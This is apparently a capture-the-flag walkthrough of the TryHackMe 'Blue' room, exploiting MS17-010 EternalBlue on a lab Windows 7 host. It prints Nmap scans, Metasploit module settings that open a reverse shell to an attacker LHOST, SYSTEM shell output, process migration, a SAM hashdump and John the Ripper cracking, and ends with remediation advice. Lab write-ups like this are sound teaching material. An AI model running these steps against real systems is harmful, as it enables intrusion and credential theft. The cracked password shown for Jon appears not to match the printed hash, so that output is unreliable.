---
title: "TryHackMe: Blue (EternalBlue MS17-010 Exploitation)"
author: parthpandey
categories: [TryHackMe, Walkthroughs]
tags: [windows, ms17-010, eternalblue, smb, metasploit, meterpreter, privesc]
render_with_liquid: false
---

**Blue** is a classic Windows exploitation challenge focused on understanding and exploiting the infamous **MS17-010 (EternalBlue)** vulnerability in Microsoft's SMBv1 implementation. This walkthrough documents the end-to-end kill chain: reconnaissance, vulnerability verification with NSE scripts, remote code execution via Metasploit, kernel pool exploitation, post-exploitation process migration, and credential dumping.

---

## Room Information

| Detail | Value |
|---|---|
| **Platform** | TryHackMe |
| **Room URL** | [TryHackMe Blue](https://tryhackme.com/room/blue) |
| **Difficulty** | Easy |
| **Target OS** | Windows 7 Professional SP1 (Build 7601) |
| **Vulnerability** | CVE-2017-0143 (MS17-010 / EternalBlue) |

---

## 1. Reconnaissance & Service Enumeration

We begin with an aggressive full-port Nmap scan to enumerate open services, service banners, and default scripts.

```console
$ nmap -sC -sV -p- --min-rate 1000 -oN blue_nmap.txt 10.10.X.X
```

### Port Scan Findings

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
```

Key observations:
- **Port 445 (SMB)** is actively running on a Windows 7 SP1 host.
- Legacy SMBv1 is highly likely enabled on Windows 7 systems of this build level.

---

## 2. Vulnerability Verification (NSE Scripts)

Before firing exploits, we confirm vulnerability presence using Nmap's SMB vulnerability scanning script:

```console
$ nmap -p 445 --script smb-vuln-ms17-010 10.10.X.X
```

### Scan Result

```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
```

The target is confirmed vulnerable to **CVE-2017-0143**.

---

## 3. Exploitation via Metasploit

We launch Metasploit Framework and configure the `ms17_010_eternalblue` exploit module:

```console
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.X.X
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.14.X.X
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

### Exploit Execution Flow
1. Metasploit connects to IPC$ and sends malformed SMBv1 transaction packets.
2. The SMB buffer overflow triggers kernel pool grooming in ring 0.
3. Payload executes in ring 0, directly returning an elevated reverse shell:

```console
[*] Started reverse TCP handler on 10.14.X.X:4444 
[*] 10.10.X.X:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.X.X:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.10.X.X:445 - Connecting to target for exploitation.
[+] 10.10.X.X:445 - Connection established for exploitation.
[+] 10.10.X.X:445 - Target OS selected valid for OS versions: Windows 7
[*] 10.10.X.X:445 - Built packet with corrupted FEA list.
[*] Sending stage (201798 bytes) to 10.10.X.X
[*] Meterpreter session 1 opened (10.14.X.X:4444 -> 10.10.X.X:49175)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We obtain direct **NT AUTHORITY\SYSTEM** privileges without requiring secondary privilege escalation.

---

## 4. Post-Exploitation & Stability

Because MS17-010 operates at the kernel pool level, the system process hosting the payload can crash if unhandled. We immediately migrate into a stable Windows service:

```console
meterpreter > ps
...
 1284  692  spoolsv.exe       x64   0   NT AUTHORITY\SYSTEM
...

meterpreter > migrate 1284
[*] Migrating from 2140 to 1284...
[*] Migration completed successfully.
```

### Credential Dumping (SAM Database)

```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Cracking the NTLM hash for user `Jon` with John the Ripper and `rockyou.txt`:

```console
$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x32])
alqql6           (Jon)
```

---

## 5. Defensive Remediations & Key Takeaways

1. **Disable SMBv1**: Deprecated since 2014; vulnerable to unauthenticated memory corruption.
   ```powershell
   Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
   ```
2. **Apply Security Updates**: Ensure Microsoft patch **KB4012212 / MS17-010** is deployed.
3. **Perimeter Firewalls**: Block inbound TCP ports `139` and `445` at the network perimeter.
